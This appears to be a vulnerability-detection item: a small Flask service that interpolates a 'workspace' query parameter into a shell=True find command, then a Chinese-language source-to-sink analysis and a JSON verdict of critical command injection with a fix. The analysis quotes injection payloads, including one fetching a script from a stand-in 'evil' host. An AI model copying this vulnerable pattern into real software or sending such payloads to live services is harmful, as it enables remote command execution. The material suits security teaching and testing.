@@ -1,0 +1,60 @@
+LANG: python
+```python
+import os
+import subprocess
+
+from flask import Flask, jsonify, request
+
+app = Flask(__name__)
+
+
+def find_yaml_files(root_dir):
+    """List all yaml/yml config files under root_dir, skipping vendored dirs."""
+    cmd = f'find "{root_dir}" -name "*.yml" -not -path "*/node_modules/*" -not -path "*/.git/*"'
+    proc = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
+    return [p for p in proc.stdout.splitlines() if p.strip()]
+
+
+def find_projects_by_signature(root_dir, signature):
+    """Scan yaml files under root_dir for an IaC template signature string."""
+    projects = []
+    for file_path in find_yaml_files(root_dir):
+        try:
+            with open(file_path, encoding='utf-8') as fh:
+                if signature in fh.read():
+                    projects.append({'path': os.path.dirname(file_path),
+                                     'config_file': file_path})
+        except OSError:
+            continue
+    return projects
+
+
+@app.route('/api/scan/cloudformation', methods=['GET'])
+def scan_cloudformation():
+    workspace = request.args.get('workspace') or os.getcwd()
+    return jsonify(find_projects_by_signature(workspace, 'AWSTemplateFormatVersion'))
+
+
+@app.route('/api/scan/files', methods=['GET'])
+def scan_files():
+    workspace = request.args.get('workspace') or os.getcwd()
+    return jsonify({'files': find_yaml_files(workspace)})
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0', port=5000)
+```
+
+1. **第 32 行 / 第 38 行（source 枚举）**：两个 Flask 路由 `/api/scan/cloudformation` 与 `/api/scan/files` 均通过 `request.args.get('workspace')` 获取工作区根目录——这是 Flask 地道的查询参数入口，值完全由攻击者控制；`or os.getcwd()` 仅在参数缺省时兜底，不做任何过滤。第 33 行的 `signature` 参数也是外部输入，但后续验证其不进入 shell。
+
+2. **第 33 行 → 第 16/19 行 → 第 11 行（传播路径）**：`workspace` 原样传入 `find_projects_by_signature`，第 19 行再传给 `find_yaml_files(root_dir)`，全程无类型校验、无路径规范化、无白名单，污点数据未清洗直达命令拼接处。
+
+3. **第 11-12 行（sink）**：第 11 行用 f-string 把 `root_dir` 直接内插进 `find` 命令字符串（仅双引号包裹），第 12 行 `subprocess.run(cmd, shell=True, ...)` 交给 `/bin/sh` 解释执行——与原代码 `execAsync(\`find "${rootDir}" ...\`)` 语义完全等价的 sink。
+
+4. **防御核验**：唯一的“防御”是第 11 行的双引号包裹，但 POSIX shell 在双引号内仍会展开 `$(...)` 与反引号，且参数中带一个双引号字符即可提前闭合包裹区，注入 `;`、`|`、`&&` 等元字符（如 `?workspace=$(curl http://evil/sh)` 或 `?workspace=x"; id #`）；第 12 行的 `capture_output/text/timeout` 只影响 IO 与超时，不拦截注入；全文件无 `shlex.quote`、无 `shell=False` 列表传参、无目录白名单——引号包裹属可绕过的无效防御，两条数据流均无有效防御。
+
+5. **第二入口与替代通道**：第 36-39 行 `/api/scan/files` 是独立 HTTP 路由，经第 39 行直达同一 `shell=True` sink，构成第二入口，说明注入面不止一个端点；第 33 行 `signature` 参数只用于第 22 行的 Python 字符串 `in` 包含判断，从不进入 shell，非注入通道；因此全部命令注入面收敛于 `workspace → find_yaml_files → subprocess.run(shell=True)` 这条链，漏洞确认成立。
+
+```json
+{"has_vulnerability": true, "vulnerability_type": "CWE-77 OS Command Injection", "risk_level": "Critical", "source": "line 32: request.args.get('workspace') 攻击者完全可控的查询参数（line 38 第二路由 /api/scan/files 的同名参数为等价入口）", "sink": "line 12: subprocess.run(cmd, shell=True) 执行 line 11 f-string 拼接的 find 命令字符串", "explanation": "数据流1: line 32 的 workspace 经 line 33 传入 find_projects_by_signature, line 19 调用 find_yaml_files, line 11 f-string 将其内插进 find 命令, line 12 以 shell=True 交由 /bin/sh 执行, 注入 $(id) 或以双引号字符闭合包裹区即可执行任意命令; 数据流2: line 38 第二路由的 workspace 经 line 39 直达同一 sink, 可达性与危害相同; 防御核验: line 11 仅用双引号包裹变量, 双引号内 $(...) 与反引号仍被 shell 展开, 参数含双引号即可提前闭合注入分号/管道等元字符, 全代码无白名单校验、无 shlex.quote、未用 shell=False 列表传参, line 12 的 capture_output/text/timeout 仅影响 IO 与超时不构成注入防御, 引号包裹属可绕过的无效防御; 第二入口: line 36-39 的 /api/scan/files 为独立 HTTP 入口复用同一 helper 构成替代通道, line 33 的 signature 参数仅用于 line 22 的 Python 字符串包含判断不进入 shell 故非注入通道, 综上两条数据流均无有效防御, 漏洞确认成立", "fix_suggestion": "line 12: 改为 subprocess.run(['find', root_dir, '-name', '*.yml', '-not', '-path', '*/node_modules/*', '-not', '-path', '*/.git/*'], shell=False) 列表传参绕开 shell 解析, 并在 line 32 对 workspace 做存在性与根目录白名单校验"}
+```
